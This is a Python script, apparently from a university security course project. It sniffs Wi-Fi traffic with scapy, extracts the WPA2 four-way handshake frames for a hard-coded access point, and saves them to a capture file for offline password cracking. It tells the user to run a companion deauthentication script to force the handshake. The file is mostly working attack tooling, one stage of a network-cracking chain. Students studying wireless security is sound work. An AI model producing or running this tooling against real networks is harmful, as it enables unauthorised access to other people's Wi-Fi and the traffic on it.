#!/usr/bin/env python3
"""
capture.py  --  CSE 406 Project (Topic 20)  --  Group member: <NAME 1 or 2>

Sniffs 802.11 traffic on a monitor-mode interface, watches for the WPA2
4-way handshake (EAPOL-Key frames), and once it has seen msg1 + msg2 it
writes the frames to a .cap file for crack.py to attack.

Replaces airodump-ng. We use scapy's sniff(); we identify the EAPOL frames
and save them ourselves.

Prep (put NIC in monitor mode on the AP channel), then run:
    sudo python3 capture.py
Run deauth.py in another pane to speed up the handshake.
"""

from scapy.all import sniff, wrpcap, Dot11, EAPOL
import sys

# ---- configuration ----------------------------------------------------
INTERFACE = "wlan0"
AP_MAC    = "f0:9f:c2:71:22:12"    # keep handshake frames only for this BSS
OUTFILE   = "my_capture.cap"
# -----------------------------------------------------------------------

collected = []      # list that will hold the EAPOL packets we capture
seen_msgs = set()   # which handshake messages (1..4) we have seen


def handshake_message_number(eapol_bytes):
    """Return 1/2/3/4 for an EAPOL-Key frame, from the Key Information bits."""
    # Key Information is a 16-bit field at offset 5..6 of the EAPOL payload.
    key_info = (eapol_bytes[5] << 8) | eapol_bytes[6]
    mic    = key_info & 0x0100      # MIC present?   (set in msg 2,3,4)
    ack    = key_info & 0x0080      # ACK bit?       (set in msg 1,3 from AP)
    secure = key_info & 0x0200      # Secure bit?    (set in msg 3,4)
    if ack and not mic:
        return 1
    if mic and not ack and not secure:
        return 2
    if mic and ack:
        return 3
    if mic and secure and not ack:
        return 4
    return 0


def process(pkt):
    """Called by sniff() for every packet. Keep the relevant EAPOL ones."""
    if not pkt.haslayer(EAPOL) or not pkt.haslayer(Dot11):
        return
    # keep only frames that belong to our target BSS
    addrs = (str(pkt.addr1).lower(), str(pkt.addr2).lower(), str(pkt.addr3).lower())
    if AP_MAC.lower() not in addrs:
        return

    raw = bytes(pkt[EAPOL])
    msg = handshake_message_number(raw)
    if msg:
        collected.append(pkt)
        seen_msgs.add(msg)
        print(f"[+] Captured handshake message {msg}  "
              f"({len(seen_msgs)}/4 unique so far)")

    # msg1 (ANonce) + msg2 (SNonce + MIC) is all crack.py needs.
    if {1, 2}.issubset(seen_msgs):
        print("[+] Have msg1 + msg2 -- enough to crack. Saving.")
        wrpcap(OUTFILE, collected)
        print(f"[+] Wrote {len(collected)} frames to {OUTFILE}")
        sys.exit(0)


def main():
    print(f"[*] Sniffing on {INTERFACE} for a handshake with {AP_MAC}")
    print("[*] Run deauth.py in another pane to trigger it faster.")
    # store=False -> don't keep every packet in memory, only what we append.
    sniff(iface=INTERFACE, prn=process, store=False)


if __name__ == "__main__":
    main()
